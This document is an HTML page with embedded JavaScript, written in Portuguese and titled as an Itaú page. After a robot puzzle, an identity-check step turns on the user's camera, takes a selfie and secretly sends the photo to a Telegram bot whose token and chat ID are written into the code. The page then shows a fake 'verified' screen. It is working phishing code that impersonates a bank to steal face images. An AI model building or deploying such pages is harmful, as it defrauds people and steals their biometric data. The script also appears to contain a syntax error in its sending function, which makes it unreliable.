<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>Monte o robÃ´ â€“ ItaÃº</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#0a2540;color:#fff;display:flex;min-height:100vh;align-items:center;justify-content:center;flex-direction:column}
.card{background:#fff;color:#003366;border-radius:16px;padding:24px;max-width:340px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
h2{font-size:18px;margin-bottom:12px}
p{font-size:14px;margin-bottom:16px}
.pieces{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:16px}
.piece{width:100%;aspect-ratio:1/1;background:#f1f1f1;border:2px solid transparent;border-radius:8px;cursor:pointer;position:relative}
.piece img{width:100%;height:100%;object-fit:contain}
.piece.wrong{border-color:#e74c3c}
.piece.ok{border-color:#00c851}
button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
button:disabled{background:#999;cursor:not-allowed}
button:active{transform:scale(.98)}
video{width:100%;border-radius:8px;margin-bottom:10px;display:none}
canvas{display:none}
</style>
</head>
<body>

<!-- ETAPA 1 â€“ QUEBRA-CABEÃ‡A -->
<div id="step1" class="card">
  <h2>Monte o robÃ´</h2>
  <p>Clique nas peÃ§as <strong>na ordem</strong> (1 a 6).</p>
  <div class="pieces" id="pieces"></div>
  <button id="continue1" disabled>Continuar</button>
</div>

<!-- ETAPA 2 â€“ SELFIE -->
<div id="step2" class="card" style="display:none">
  <h2>Confirme sua identidade</h2>
  <video id="cam" autoplay muted></video>
  <button id="snap">Tirar selfie</button>
</div>

<!-- ETAPA 3 â€“ LISTA + PROSSEGUIR -->
<div id="step3" class="card" style="display:none">
  <h2>Verificado âœ…</h2>
  <p>Apoiadores confirmados:</p>
  <ul style="text-align:left;font-size:13px;padding-left:20px">
    <li>Carlos Henrique â€“ DJ</li>
    <li>Amanda Souza â€“ SeguranÃ§a</li>
    <li>Lucas Oliveira â€“ Bar</li>
    <li>Tamires Lima â€“ Entradas</li>
    <li>Rafael Gomes â€“ Som</li>
    <li>JÃ©ssica Costa â€“ AmbulÃ¢ncia</li>
    <li>Bruno Silva â€“ Limpeza</li>
    <li>Luana Ferreira â€“ DecoraÃ§Ã£o</li>
  </ul>
  <p style="font-size:11px;color:#666;margin-top:12px">LicenÃ§a de baile emitida com sucesso.</p>
  <button id="prossegue">Prosseguir</button>
</div>

<script>
// CONFIG
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

// IMAGENS BASE64 (pequenos Ã­cones SVG)
const imgs = [
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIxMCIgeT0iMTAiIHdpZHRoPSI4MCIgaGVpZ2h0PSIzMCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // cabeÃ§a
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyMCIgeT0iMTUiIHdpZHRoPSI2MCIgaGVpZ2h0PSIyMCIgcng9IjYiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // pescoÃ§o
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSI1IiB5PSI1IiB3aWR0aD0iOTAiIGhlaWdodD0iNDAiIHJ4PSIxMCIgZmlsbD0iIzAwMzM2NiIvPjwvc3ZnPg==', // tronco
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIxMCIgeT0iMTAiIHdpZHRoPSIzNSIgaGVpZ2h0PSI2MCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // braÃ§o esq
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSI1NSIgeT0iMTAiIHdpZHRoPSIzNSIgaGVpZ2h0PSI2MCIgcng9IjgiIGZpbGw9IiMwMDMzNjYiLz48L3N2Zz4=', // braÃ§o dir
  'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB4PSIyNSIgeT0iMTAiIHdpZHRoPSI1MCIgaGVpZ2h0PSI3MCIgcng9IjEwIiBmaWxsPSIjMDAzMzY2Ii8+PC9zdmc+'  // pernas
];

// EMBARALHA
const shuffle = a => a.sort(() => Math.random() - 0.5);

// MONTA PEÃ‡AS
let seq = [];
const piecesBox = document.getElementById('pieces');
[0,1,2,3,4,5].forEach(i => {
  const div = document.createElement('div');
  div.className = 'piece';
  div.dataset.idx = i;
  const img = document.createElement('img');
  img.src = imgs[i];
  div.appendChild(img);
  piecesBox.appendChild(div);
});
shuffle([...piecesBox.children]).forEach(el => piecesBox.appendChild(el));

// CLICK NAS PEÃ‡AS
document.querySelectorAll('.piece').forEach(p => p.addEventListener('click', () => {
  const idx = Number(p.dataset.idx);
  if (seq.length === idx) {
    seq.push(idx);
    p.classList.add('ok');
    if (seq.length === 6) document.getElementById('continue1').disabled = false;
  } else {
    p.classList.add('wrong');
    setTimeout(() => p.classList.remove('wrong'), 400);
  }
}));

// CONTINUAR â†’ ABRE CÃ‚MERA
document.getElementById('continue1').addEventListener('click', () => {
  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2').style.display = 'block';
  document.getElementById('cam').style.display = 'block';
  navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}})
    .then(s => {
      document.getElementById('cam').srcObject = s;
    });
});

// TIRAR SELFIE
document.getElementById('snap').addEventListener('click', () => {
  const v = document.getElementById('cam');
  const canvas = document.createElement('canvas');
  canvas.width = 640; canvas.height = 480;
  canvas.getContext('2d').drawImage(v, 0, 0);
  canvas.toBlob(blob => {
    enviaTelegram('ðŸ“¸ selfie', blob);
    v.srcObject.getTracks().forEach(t => t.stop());
    document.getElementById('step2').style.display = 'none';
    document.getElementById('step3').style.display = 'block';
  }, 'image/jpeg', 0.9);
});

// ENVIA TELEGRAM
const enviaTelegram = (msg, media) => {
  const url = media
    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    body: media
      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
    headers: media ? {} : {'Content-Type':'application/json'}
  });
});

// AÃ‡ÃƒO FINAL
document.getElementById('prossegue').addEventListener('click', () => {
  alert('Tudo certo! Prosseguindo...');
});
</script>
</body>
</html>
